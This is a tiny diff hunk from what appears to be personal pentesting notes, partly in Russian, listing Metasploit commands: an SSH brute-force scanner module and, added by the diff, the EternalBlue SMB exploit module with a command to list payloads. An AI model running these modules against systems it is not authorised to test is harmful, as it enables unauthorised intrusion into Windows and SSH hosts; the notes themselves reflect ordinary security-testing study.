@@ -71,3 +71,9 @@ exploit
 
 Для брута use auxiliary/scanner/ssh/ssh_login
 
+
+
+eternalblue
+
+use exploit/windows/smb/ms17_010_eternalblue
+   show payloads
